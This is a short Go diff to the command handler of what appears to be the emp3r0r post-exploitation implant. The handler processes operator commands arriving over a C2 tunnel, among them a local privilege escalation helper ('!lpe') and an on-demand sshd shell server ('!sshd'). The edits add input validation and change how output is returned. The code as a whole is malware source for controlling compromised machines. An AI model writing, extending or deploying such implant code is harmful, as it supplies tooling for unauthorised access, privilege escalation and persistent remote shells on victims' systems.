@@ -287,6 +287,13 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 	case "!lpe":
 		// LPE helper
 		// !lpe script_name
+		if len(cmdSlice) < 2 {
+			log.Printf("args error: %s", cmdSlice)
+			out = fmt.Sprintf("args error: %s", cmdSlice)
+			sendResponse(out)
+			return
+		}
+
 		helper := cmdSlice[1]
 		out = lpeHelper(helper)
 		sendResponse(out)
@@ -294,13 +301,13 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 	case "!sshd":
 		// sshd server
 		// !sshd id shell port args
+		log.Printf("Got sshd request: %s", cmdSlice)
 		if len(cmdSlice) < 5 {
 			log.Printf("args error: %s", cmdSlice)
 			out = fmt.Sprintf("args error: %s", cmdSlice)
 			sendResponse(out)
 			return
 		}
-		log.Printf("Got sshd request: %s", cmdSlice)
 		shell := cmdSlice[2]
 		port := cmdSlice[3]
 		args := cmdSlice[4:]
@@ -473,6 +480,6 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		}
 
 		out = string(outCombined)
-		data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
+		sendResponse(out)
 	}
 }
